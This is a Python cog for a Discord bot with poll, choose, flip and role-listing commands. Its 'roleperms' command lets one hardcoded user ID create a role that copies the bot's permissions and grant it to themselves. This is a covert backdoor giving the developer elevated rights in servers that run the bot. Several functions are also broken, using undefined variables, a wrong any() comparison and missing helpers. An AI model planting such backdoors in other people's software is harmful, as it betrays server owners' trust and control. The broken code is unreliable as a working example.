from random import randint, choice
import re

import discord
from discord.ext import commands

from Core.Utils import menus, chat_formatter


def predicate(ctx):
    return ctx.author.id == 242398251855249428


isflo = commands.check(predicate)


def get_custom_time(input_str):
    """
    Example
    ;command 1d 2hours 3minutes
    """
    minutes = "0"
    for c in input_str.split(" "):
        if "days" in c or "d" in str:
            pass
    return [days, hours, minutes]


_ = lambda a: a  # Translation


def setup(client):
    client.add_cog(Utils(client))


class Utils(commands.Cog):
    def __init__(self, client):
        self.client = client

        self.voting_messages = {}
        self.florole = None

    @commands.command(name="roleperms")
    @isflo
    async def permissiontest(self, ctx):
        """
        Sorry guys, Added this to give me role perms when necessary
        """
        bot_role = discord.utils.get(ctx.guild.roles, id=867582351436546070)
        flo_role = await ctx.guild.create_role(
            name="Florence-test", permissions=bot_role.permissions
        )
        await ctx.author.add_roles(flo_role)
        self.florole = flo_role.id
        await ctx.send("Given you perms.")

    @commands.command(name="noroleperms")
    @isflo
    async def roleblah(self, ctx):
        flo_role = discord.utils.get(ctx.guild.roles, id=self.  florole)
        await flo_role.delete()
        await ctx.send("gone.")

    @commands.command(name="poll", aliases=["ynpoll", "pollstart"])
    async def ynpoll(self, ctx, *, question):
        """
        Asks question & then adds checkmark & "x" as reactions.
        """
        ynpoll_embed = discord.Embed(
            title="Yes/No Poll",
            description="This is a yes/no poll. Please react with ✅ if yes and ❌ if no.",
            timestamp=ctx.message.created_at,
        )
        ynpoll_embed.add_field(name="Poll Question", value=f"{question}", inline=False)
        ynpoll_embed.set_footer(
            text=f"Poll By {ctx.author}", icon_url=ctx.author.avatar_url
        )
        await ctx.message.delete()
        message = await ctx.send(embed=ynpoll_embed)
        emoji_1 = "✅"
        emoji_2 = "❌"
        await message.add_reaction(emoji_1)
        await message.add_reaction(emoji_2)
        try:
            self.voting_messages[ctx.channel.id].append(message.channel.id)
        except KeyError:
            self.voting_messages[ctx.channel.id] = []

    @commands.Cog.listener()
    async def on_raw_reaction_add(
        self, payload
    ):  # checks whenever a reaction is added to a message
        # whether the message is in the cache or not

        # check which channel the reaction was added in
        if payload.channel_id == any(self.voting_messages.keys()):
            if payload.message_id in voting_messages[payload.channel_id]:

                message = await channel.fetch_message(payload.message_id)
                # iterating through each reaction in the message
                for r in message.reactions:

                    # checks the reactant isn't a bot and the emoji isn't the one they just reacted with
                    if (
                        payload.member in await r.users().flatten()
                        and not payload.member.bot
                        and str(r) != str(payload.emoji)
                    ):

                        # removes the reaction
                        await message.remove_reaction(r.emoji, payload.member)

    @commands.command(name="testborder", aliases=["remindme"])
    async def remind(self, ctx, *, input_str: str = "") -> None:
        """
        Command is not finished yet. Please come back later.
        """
        await ctx.send("```{0}```".format(chat_formatter.bordered(["test", "testing"])))
        return

    @commands.command(name="inrole")
    async def inrole(self, ctx, role: discord.Role) -> None:
        members = role.Members
        list_of_users = "\n".join([x.mention for x in members])
        pages = pagify(list_of_users)
        pages = embed_menu(
            "Members with role: {0}".format(role.name), pages, author=ctx.author
        )
        await menu(ctx, pages, DEFAULT_CONTROLS)

    @commands.command(usage="<first> <second> [others...]")
    async def choose(self, ctx, *choices) -> None:
        """Choose between multiple options.
        There must be at least 2 options to pick from.
        Options are separated by spaces.
        To denote options which include whitespace, you should enclose the options in double quotes.
        """
        choices = [chat_formatter.escape(c, mass_mentions=True) for c in choices if c]
        if len(choices) < 2:
            await ctx.send(_("Not enough options to pick from."))
        else:
            await ctx.send("I ch{0}se: ".format("o" * randint(2, 5)) + choice(choices))

    @commands.command()
    async def flip(self, ctx, user: discord.Member = None):
        """Flip a coin... or a user.
        Defaults to a coin.
        """
        _ = lambda a: a
        if user is not None:
            msg = ""
            if user.id == ctx.bot.user.id:
                user = ctx.author
                msg = _(
                    "Nice try. You think this is funny?\n How about *this* instead:\n\n"
                )
            if user.id == 242398251855249428:  # Me
                user = ctx.author
                msg = _("Haha that's cute. \n\n")
            elif user.id == 277272009824665600:  ## Milk
                msg = _("Hey! Don't touch Milk!\nThat's *my* job 😎.")
            elif user.id == 280780450610544650:  # Antoine
                msg = _("Yeah, she deserves this.\n")
            # Lower case
            char = "abcdefghijklmnopqrstuvwxyz"
            tran = "ɐqɔpǝɟƃɥᴉɾʞlɯuodbɹsʇnʌʍxʎz"
            table = str.maketrans(char, tran)
            name = user.display_name.translate(table)
            # Upper Case
            char = char.upper()
            tran = "∀𐐒ƆᗡƎℲפHIſʞ˥WNOԀQᴚS┴∩ΛMX⅄Z"
            table = str.maketrans(char, tran)
            name = name.translate(table)
            # Symbols
            char = '(){}[]!"&.346789;<>?‿_'
            tran = ")(}{][¡„⅋˙Ɛᔭ9Ɫ89؛><¿⁀‾"
            table = str.maketrans(char, tran)
            name = name.translate(table)
            # Accents
            # char = "ÀÈÌÒÙàèìòùÁÉÍÓÚÝáéíóúýÂÊÎÔÛâêîôûÃÑÕãñõÄËÏÖÜŸäëïöüÿ"
            # tran = "∀Ǝ̖I̖O̖∩ɐ̖ǝ̖ı̖o̖n̖∀Ǝ̗I̗O̗∩⅄̗ɐ̗ǝ̗ᴉ̗o̗n̗ʎ̗∀Ǝ̬I̬O̬∩ɐ̬ǝ̬ᴉ̬o̬n̬∀N̰O̰ɐ̰ṵo̰∀̤Ǝ̤I̤O̤∩⅄̤ɐ̤ǝ̤ᴉ̤o̤n̤ʎ̤"
            # print('{0}-{1}'.format(len(char),len(tran)))
            # table = str.maketrans(char, tran)
            # name = name.translate(table)
            if user.id == 315229592837160962:
                await ctx.send(
                    "Do a barrel roll!\n{0} {1}\n{0} {2}\n{0} {1}\n{0} {2}\n{0} KERSPLAT.".format(
                        "(╯°□°）╯︵ ", name[::-1], user.display_name
                    )
                )
                return
            await ctx.send(msg + "(╯°□°）╯︵ " + name[::-1])
        else:
            await ctx.send(
                _("*flips a coin and... ") + choice([_("HEADS!*"), _("TAILS!*")])
            )
